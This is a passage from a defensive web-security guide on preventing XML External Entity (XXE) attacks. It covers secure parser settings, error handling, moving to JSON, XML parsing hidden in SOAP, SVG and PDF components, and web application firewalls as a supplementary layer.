Even with updated libraries, secure configuration of XML parsers is essential. Several XML features enable XXE attacks and should be disabled whenever possible.

Disabling custom Document Type Definitions prevents attackers from defining malicious entities in the XML payload. DTDs are the primary mechanism used to declare entities, which attackers exploit to access system resources.

Disabling external entity resolution prevents the parser from retrieving files or network resources referenced in the XML document. This directly blocks the most common XXE exploitation technique used to read sensitive files like system configuration files.

Disabling parameter entity processing prevents attackers from building complex entity chains or nested references, which are often used in advanced XXE exploitation scenarios.

Disabling XInclude support prevents attackers from including external documents during XML processing. XInclude can otherwise be abused to retrieve arbitrary files.

Preventing entity reference loops protects against denial-of-service attacks such as the "Billion Laughs" attack, where recursive entities cause exponential memory consumption.

**ERROR HANDLING**

Another important defense involves controlling application error messages. Some XXE exploitation techniques rely on verbose error messages returned by the server.

Error-based XXE attacks intentionally trigger parser errors that include sensitive information in the response. If runtime errors are displayed to users, attackers may extract file contents or internal paths through these error messages.

Secure applications should:

- Implement proper exception handling
    
- Log errors internally
    
- Disable runtime error display on production servers
    

This prevents attackers from leveraging XML parsing errors to extract sensitive data.

**ALTERNATIVE DATA FORMATS**

Because XML has historically introduced multiple security issues, many modern systems prefer simpler data formats such as JSON or YAML.

JSON-based APIs are now widely used through REST architectures. These formats avoid many XML-specific features such as entities and DTDs, which removes entire classes of attacks like XXE.

Migrating from XML-based protocols like SOAP to JSON-based REST APIs significantly reduces complexity and potential attack vectors.

**COMPONENTS THAT MAY PARSE XML**

Developers often overlook components that internally process XML. These components may silently introduce XXE vulnerabilities if their underlying parsers are outdated or misconfigured.

Common examples include:

- SOAP API libraries
    
- SVG image processing engines
    
- PDF rendering libraries
    

Attackers frequently target these secondary parsers because developers may not realize XML is being processed at all.

**PROTECTION LAYERS**

Web Application Firewalls can provide an additional layer of protection by detecting suspicious XML payloads or entity declarations.

However, WAFs should never be the primary defense. Attackers regularly bypass WAF rules through payload obfuscation or alternative XML features.

The correct defensive strategy is:

1. Secure XML parser configuration
    
2. Up-to-date libraries and dependencies
    
3. Proper error handling
    
4. Optional WAF protection as a supplementary layer
    

This layered approach significantly reduces the risk of XXE exploitation in modern web applications.
#
#
#
#
#
#
#